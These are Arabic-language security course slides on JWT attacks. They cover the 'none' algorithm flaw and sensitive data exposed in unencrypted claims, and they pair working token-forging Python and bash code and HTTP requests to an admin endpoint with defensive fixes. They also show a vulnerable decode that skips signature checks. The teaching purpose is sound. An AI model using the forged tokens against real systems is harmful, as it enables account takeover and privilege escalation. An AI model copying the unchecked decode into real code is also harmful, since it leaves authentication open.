# 🎓 الجزء 10: JWT Attacks — None Algorithm + Exposed Claims
## Slides 147 → 155

---

## Slide 147: عنوان القسم — The None Algorithm Vulnerability
### سلايد 147:

دلوقتي بعد ما فهمنا بنية الـ JWT بالتفصيل — يلا ندخل في **ATTACKS**!

أول ثغرة هنشوفها هي واحدة من أخطر وأبسط ثغرات الـ JWT — ثغرة **None Algorithm**.

---

## Slide 148: تعريف الثغرة
### سلايد 148:

### إيه هي ثغرة الـ None Algorithm؟

> ثغرة الـ **None Algorithm** بتحصل لما الـ JWT بيتوقع بـ Algorithm = `none`. ده معناه إن الـ Token **مفيهوش توقيع**! والسيرفر بيقبله كإنه صالح.

```json
// JWT Header عادي:
{
    "alg": "HS256",    // الـ Token موقع بخوارزمية HS256
    "typ": "JWT"
}

// JWT Header بثغرة None Algorithm:
{
    "alg": "none",     // مفيش توقيع! ← 
    "typ": "JWT"
}
```

---

## Slide 149: أسباب الثغرة
### سلايد 149:

### إيه اللي بيسبب الثغرة دي؟

### 1. مكتبات JWT بتدعم `none` Algorithm


كتير من مكتبات الـ JWT بتدعم "none" Algorithm عشان:
1. الأغراض التجريبية (Testing/Development)
2.  لما الـ Token مش محتاج Signature (نادر)

المشكلة: لو المكتبة متراجعش عليها صح في Production
← هتقبل Tokens بدون Signature! 


### 2. التطبيق مش بيتحقق من الـ Signature

```python
#  كود ضعيف — مش بيتحقق من الـ Algorithm:
payload = jwt.decode(token, options={"verify_signature": False})
# ده بيفك الـ Token بدون التحقق من التوقيع!

#  كود آمن — بيتحقق من الـ Algorithm:
payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
# هنا بيحدد إن بس HS256 مقبول — none ممنوع!
```

### 3. التطبيق بيثق في الـ JWT Header

```
المشكلة:
الـ JWT Header بيقول: "أنا موقع بـ none"
السيرفر بيقول: "OK خلاص مش هتحقق من التوقيع"

المفروض:
السيرفر يكون عنده Whitelist بالـ Algorithms المقبولة
ويتجاهل أي حاجة تانية
```

---

## Slide 150-151: إزاي الهجمة بتشتغل
### سلايد 150-151:

### How it Works — خطوة بخطوة

### الخطوة 1: المهاجم بيغير الـ Header

```json
// الـ Header الأصلي:
{
    "alg": "HS256",
    "typ": "JWT"
}

// المهاجم يغيره لـ:
{
    "alg": "none",
    "typ": "JWT"
}
```

### الخطوة 2: المهاجم بيعدل الـ Payload

```json
// الـ Payload الأصلي:
{
    "sub": "1234567890",
    "name": "Ahmed",
    "role": "user"
}

// المهاجم يغيره لـ:
{
    "sub": "1234567890",
    "name": "Ahmed",
    "role": "admin"     // Privilege Escalation! 
}
```

### الخطوة 3: المهاجم يزيل الـ Signature

```
الـ Token الأصلي:
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.signature_here
                                              ↑ Signature

الـ Token المزور:
eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0.
                                                                ↑ Signature فاضي!

لاحظ: النقطة الأخيرة (.) موجودة بس مفيش حاجة بعدها!
```

### الـ Flow الكامل:

```mermaid
%%{init: {'theme': 'base', 'themeVariables': { 'fontSize': '18px', 'primaryColor': '#0d1117', 'primaryTextColor': '#c9d1d9', 'primaryBorderColor': '#30363d', 'lineColor': '#f85149', 'secondaryColor': '#161b22', 'tertiaryColor': '#21262d', 'noteTextColor': '#c9d1d9', 'noteBkgColor': '#161b22', 'actorTextColor': '#c9d1d9', 'actorBkg': '#0d1117', 'actorBorder': '#f85149', 'signalColor': '#c9d1d9', 'signalTextColor': '#ffffffff', 'labelBoxBkgColor': '#161b22', 'labelTextColor': '#c9d1d9'}}}%%
sequenceDiagram
    participant A as 🕵️ المهاجم
    participant S as 🖥️ السيرفر

    Note over A: 1. ياخد JWT شرعي
    A->>A: يفك الـ Header → يغير alg لـ "none"
    A->>A: يفك الـ Payload → يغير role لـ "admin"
    A->>A: يمسح الـ Signature (يسيب النقطة فاضية)
    
    A->>S: GET /admin<br/>Authorization: Bearer eyJhbG...none...
    
    Note over S: بيقرأ الـ Header:<br/>alg = "none"<br/>→ مش هيتحقق من Signature!
    Note over S: بيقرأ الـ Payload:<br/>role = "admin"<br/>→ هيديله Admin Access!
    
    S-->>A: 200 OK → Admin Panel 💀
```

**شرح الـ Diagram:**
المهاجم بياخد Token عادي، يغير الـ `alg` في الـ Header لـ `"none"`، يعدل الـ Payload (يغير الـ role لـ admin)، ويمسح الـ Signature. السيرفر الضعيف بيقرأ إن الـ Algorithm هو `none` فمش بيتحقق من التوقيع — وبيقبل الـ Token المزور!

---

## Slide 152: إزاي الثغرة بتشتغل
### سلايد 152:

### Exploitation Scenarios

**1. Privilege Escalation (ترقية الصلاحيات):**
```
المهاجم بيغير الـ Payload:
من: {"role": "user"}
لـ: {"role": "admin"}

وبيحصل على صلاحيات الـ Admin!
```

**2. Impersonation (انتحال الشخصية):**
```
المهاجم بيغير الـ Payload:
من: {"sub": "attacker_id", "name": "Attacker"}
لـ: {"sub": "victim_id", "name": "Victim"}

وبيدخل حساب الضحية!
```

**3. Session Hijacking (سرقة الجلسة):**
```
المهاجم بيزور Token فيه بيانات مستخدم تاني
ويدخل جلسته بدون ما يسرق أي حاجة!
```

### إزاي تعمل الهجمة عملياً:

```python
import base64
import json

# الـ Token الأصلي (جبته من الموقع عادي):
original_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIn0.ABC123"

# الخطوة 1: اعمل Header جديد بـ alg=none
header = {"alg": "none", "typ": "JWT"}
encoded_header = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).decode().rstrip('=')

# الخطوة 2: اعمل Payload معدل
payload = {"sub": "42", "role": "admin"}  # غيرنا الـ role!
encoded_payload = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip('=')

# الخطوة 3: Token بدون Signature (نقطة فاضية)
forged_token = f"{encoded_header}.{encoded_payload}."

print(f"Forged Token: {forged_token}")
# النتيجة: eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiNDIiLCAicm9sZSI6ICJhZG1pbiJ9.
```

### الحماية:

```javascript
//  الحل 1: حدد الـ Algorithms المقبولة بوضوح:
const payload = jwt.verify(token, SECRET_KEY, {
    algorithms: ['HS256']  // بس HS256 مقبول — none ممنوع!
});

//  الحل 2: ارفض أي Token بدون Signature:
if (token.split('.').length !== 3 || token.endsWith('.')) {
    throw new Error('Invalid Token Format');
}

//  الحل 3: استخدم مكتبة JWT حديثة ومحدثة
// المكتبات الحديثة بترفض "none" بـ Default
```

---

## Slide 153: Lab Demo — None Algorithm
### سلايد 153:

### Lab Demo: The None Algorithm Vulnerability

### السيناريو:
التطبيق بيستخدم JWT للـ Authentication والمكتبة بتقبل `none` Algorithm.

### الخطوات:

**1. سجل دخول وخد الـ JWT:**
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "testuser", "password": "password123"}

# Response:
{"token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIn0.signature"}
```

**2. فك الـ Token في jwt.io:**
```
Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "42", "role": "user"}
```

**3. عدل الـ Header والـ Payload:**
```
New Header: {"alg": "none", "typ": "JWT"}
New Payload: {"sub": "42", "role": "admin"}
```

**4. ابني Token جديد بدون Signature:**
```bash
# Header:
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
# Payload:
echo -n '{"sub":"42","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_'
# Token = Header.Payload.  (نقطة فاضية في الآخر)
```

**5. استخدم الـ Token المزور:**
```http
GET /admin HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiJ9.
```

**6. لو الـ Response 200 OK → Vulnerability Confirmed!**

---

## Slide 154: عنوان القسم — Exposed Claims
### سلايد 154:

### Exposed Claims — البيانات المكشوفة في الـ JWT

خلينا نرجع لنقطة مهمة: الـ JWT Payload **مش مشفر**. ده Base64 Encoding بس. أي حد عنده الـ Token يقدر يقرأ كل الـ Claims.

### ليه ده مشكلة؟

```
لو المبرمج حط بيانات حساسة في الـ Payload:

{
    "sub": "42",
    "name": "Ahmed",
    "email": "ahmed@company.com",      // PII! 
    "ssn": "123-45-6789",             // Social Security Number! 
    "password": "mypassword123",       // الباسورد!! 
    "credit_card": "4111-1111-1111",  // رقم الكريديت كارد! 
    "internal_api_key": "sk_live_..."  // مفتاح API داخلي! 
}

مش بتحصل كتير يعني بس موجودة 
```

### كـ Pentester — إيه اللي بدور عليه في الـ Claims؟

```
بيانات حساسة (PII):
→ email, phone, address, SSN, date_of_birth

بيانات أمنية:
→ password, api_key, secret, private_key

بيانات بنية تحتية:
→ server_name, database_url, internal_ip

بيانات صلاحيات:
→ role, permissions, is_admin, groups
```

### الحماية من Exposed Claims:

```javascript
//  الحل 1: متحطش بيانات حساسة في الـ JWT!
// حط User ID بس — وباقي البيانات يجيبها من الـ Database
const token = jwt.sign(
    { sub: user.id },  // User ID بس!
    SECRET_KEY
);

//  الحل 2: استخدم JWE (JSON Web Encryption)
// الـ Payload بيبقى مشفر — مش Base64 بس

//  الحل 3: قلل الـ Claims للحد الأدنى
// بس اللي التطبيق محتاجه فعلاً
```

---

## Slide 155: Lab Demo — Exposed Claims
### سلايد 155:

### Lab Demo: Exposed Claims

### السيناريو:
التطبيق بيحط بيانات حساسة في الـ JWT Payload.

### الخطوات:

**1. سجل دخول واحصل على الـ JWT**

**2. فك الـ Payload:**
```bash
# خد الجزء التاني من الـ Token (ما بين النقطتين):
echo "eyJzdWIiOiI0MiIsImVtYWlsIjoiYWhtZWRAY29tcGFueS5jb20iLCJyb2xlIjoiYWRtaW4iLCJhcGlfa2V5Ijoic2tfbGl2ZV8xMjM0NSJ9" | base64 -d

# النتيجة:
# {"sub":"42","email":"ahmed@company.com","role":"admin","api_key":"sk_live_12345"}
```

**3. حلل الـ Claims:**
```
 sub: "42"                   → User ID — عادي
 email: "ahmed@company.com"  → PII — مش مطلوب في الـ Token
 role: "admin"               → صلاحية — ممكن يتلاعب بيها
 api_key: "sk_live_12345"    → مفتاح API — خطر جداً!
```


---

## 🎯 ملخص الجزء العاشر

| المفهوم | الشرح |
|---------|-------|
| **None Algorithm** | المهاجم يغير `alg` لـ `"none"` ويمسح الـ Signature — السيرفر يقبل الـ Token بدون تحقق |
| **الأسباب** | مكتبات JWT بتدعم `none` + السيرفر مش بيحدد Algorithms مقبولة |
| **الاستغلال** | Privilege Escalation + Impersonation + Session Hijacking |
| **الحماية** | حدد Algorithms مقبولة + ارفض `none` + استخدم مكتبة محدثة |
| **Exposed Claims** | الـ Payload مش مشفر — Base64 بس — أي حد يقرأه |
| **خطر الـ Exposure** | PII, API Keys, Passwords, Internal Data بتبقى مكشوفة |
| **الحل** | متحطش بيانات حساسة في الـ JWT + استخدم JWE للتشفير |

> **📝 الجزء الجاي (Session 11):** هندخل في **OAuth 2.0** — المفاهيم الأساسية، الـ Components، الـ Flows الأربعة، وإزاي بيشتغل عملياً.
